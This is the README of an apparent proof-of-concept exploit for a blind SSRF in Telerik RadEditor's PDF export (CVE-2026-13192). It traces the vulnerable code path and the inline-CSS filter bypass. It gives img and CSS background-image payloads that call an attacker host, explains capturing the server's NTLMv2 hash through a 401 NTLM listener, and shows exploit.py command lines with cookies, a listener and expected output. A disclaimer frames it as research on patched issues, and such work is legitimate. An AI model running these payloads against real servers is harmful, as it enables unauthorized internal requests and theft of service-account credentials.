# RadEditor PDF Export Blind SSRF

Proof-of-concept for the blind SSRF in RadEditor's PDF export feature (CVE-2026-13192) in Telerik UI for ASP.NET AJAX, fixed in 2026.2.708.

## Vulnerability

When RadEditor exports content to PDF, the server-side renderer (ApocPdfGenerator) fetches every image URL embedded in the editor's HTML. Before 2026.2.708, `ApocImageFactory.Make()` accepted any `http://` or `https://` URL with no private-IP or hostname validation. The renderer also attached `CredentialCache.DefaultCredentials` to every outbound request, leaking the IIS application pool account's NTLMv2 hash to any HTTP listener the adversary controlled.

Two injection vectors reach the same sink:

1. `<img src="http://attacker/probe">` in the editor content.
2. `<p style="background-image: url(http://attacker/probe)">` via inline CSS.

The CSS vector bypasses `RemoveUnsafeAttributeUrls()`, which only strips `file://` and UNC prefixes from named attributes (`src`, `href`) and does not inspect inline `style` values.

This is a blind SSRF. The PDF renderer consumes the response body and never returns it to the caller. The adversary observes only the inbound connection on their listener, not the fetched content. On pre-patch versions, the NTLMv2 hash leak made this more impactful than a typical blind SSRF.

This vulnerability requires authentication (CVSS PR:L).

---

## Attack path

```
POST /editor_export.aspx
  RadEditor1=<img src="http://attacker/probe" />
  btnExportPdf=Export
    |
    v
Button1_Click()
  -> RadEditor1.ExportToPdf()
    -> Export(_pdfExportTemplate)                        (ApocPdfGenerator)
      -> ValidateContentForExport(content)
        -> RemoveLocalFilesUrls()                        (strips file:// from CSS url() only)
        -> RemoveUnsafeAttributeUrls()                   (strips file:// and UNC from src/href)
                                                         (does NOT inspect inline style values)
      -> ApocPdfGenerator renders HTML to PDF via XSLT
        -> encounters <img src="http://attacker/probe">
        -> ApocImageFactory.Make(uri)
          -> GetImageStream(uri)
            -> new WebRequest(uri)
            -> webRequest.Credentials = CredentialCache.DefaultCredentials    (pre-2026.2.630)
            -> webRequest.GetResponse()                  (outbound HTTP to attacker)
              -> NTLMv2 hash sent if attacker responds with 401 + WWW-Authenticate: NTLM
```

The CSS vector (`style="background-image: url(...)"`) follows the same path but bypasses `RemoveUnsafeAttributeUrls()` entirely because that method only inspects named attributes (`src`, `href`, `background`, `lowsrc`, `dynsrc`) and never parses inline `style` values. Both vectors converge at `ApocImageFactory.Make()`.

---

## Credential leak (pre-2026.2.630)

Before the first patch in 2026.2.630, `ApocImageFactory.GetImageStream()` assigned `CredentialCache.DefaultCredentials` to every outbound `WebRequest`:

```csharp
if (!ApocDriver.ActiveDriver.Credentials.GetEnumerator().MoveNext())
{
    webRequest.Credentials = CredentialCache.DefaultCredentials;
}
```

This means every image fetch during PDF rendering carried the IIS application pool's Windows credentials. If the adversary's HTTP listener responds with `401 WWW-Authenticate: NTLM`, `HttpWebRequest` automatically completes the NTLM handshake, leaking the NTLMv2 hash.

The 2026.2.630 hotfix removed the `DefaultCredentials` assignment, so post-hotfix versions still have a blind SSRF (the outbound request is made, but without credentials).

## Prerequisites

- Authenticated access to a page with RadEditor and a PDF export button
- An HTTP listener to observe the SSRF callback (e.g. `python3 -m http.server`)
- Python 3.8+

## Usage

```bash
pip install -r requirements.txt

# Auto-detect the RadEditor ID and print manual trigger instructions
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener http://attacker:8888/probe \
    --cookie 'ASP.NET_SessionId=abc123; .ASPXAUTH=...'

# Trigger the PDF export automatically via postback
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener http://attacker:8888/probe \
    --cookie 'ASP.NET_SessionId=abc123' \
    --export-button 'RadEditor1$ExportToPdf'

# Use only the CSS vector
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener http://attacker:8888/probe \
    --cookie 'ASP.NET_SessionId=abc123' \
    --vector css

# Route through Burp
python3 exploit.py http://target:8080 \
    --page /editor.aspx \
    --listener http://attacker:8888/probe \
    --cookie '...' \
    --proxy http://127.0.0.1:8080
```

### Flags

| Flag | Default | Purpose |
|---|---|---|
| `base` (positional) | required | Target base URL |
| `--page` | required | Page with RadEditor and PDF export |
| `--listener` | required | Your HTTP listener URL |
| `--cookie` | | Session cookie for authenticated access |
| `--editor-id` | auto-detected | RadEditor UniqueID |
| `--vector` | `both` | Injection vector: `img`, `css`, or `both` |
| `--export-button` | | `__EVENTTARGET` value for the PDF export postback |
| `--submit-button` | | Name of a regular submit button that triggers PDF export |
| `--proxy` | | HTTP proxy URL |
| `-v` | | Verbose output |

## How it works

1. GET the RadEditor page, parse hidden form fields and detect the RadEditor control ID.
2. Build HTML content containing the SSRF payload (img src, CSS background-image, or both).
3. If `--export-button` or `--submit-button` is provided, POST the form to trigger `RadEditor.ExportToPdf()` server-side, which passes the editor content to `ApocPdfGenerator`. The PDF renderer fetches the embedded URLs, triggering the SSRF.
4. If neither is provided, print the payload and manual steps for completing the attack in a browser.

## Expected output

```
[*] fetching http://target:8080/editor.aspx
[+] RadEditor ID: RadEditor1
[+] SSRF payload (both vector): <img src="http://attacker:8888/probe" /><p style="background-image: url(http://attacker:8888/probe)">y</p>
[*] triggering PDF export via __EVENTTARGET=RadEditor1$ExportToPdf
[*] watch your listener for an inbound connection
[*] HTTP 200 (45231 bytes)
[+] export completed. Check your listener for the SSRF callback.
```

On your listener:

```
10.0.0.1 - - "GET /probe HTTP/1.1" 200 -
```

On pre-patch versions (before 2026.2.630), the request includes `Authorization: NTLM ...` headers when the listener responds with `401 WWW-Authenticate: NTLM`, completing the NTLMv2 handshake and leaking the IIS app pool credentials.

## Files

| File | Description |
|---|---|
| `exploit.py` | Injects SSRF payloads into RadEditor content and triggers PDF export. |
| `requirements.txt` | Python dependencies. |
| `Dockerfile` | Python 3.12-slim container. |

## Disclaimer

The exploits and proof-of-concept code in this repository are published for
security research, defensive use, and authorised testing. All of the
vulnerabilities demonstrated here are already patched; we strongly recommend
updating Telerik UI for ASP.NET AJAX to the latest version.

## License

Released under the [MIT License](../../LICENSE).
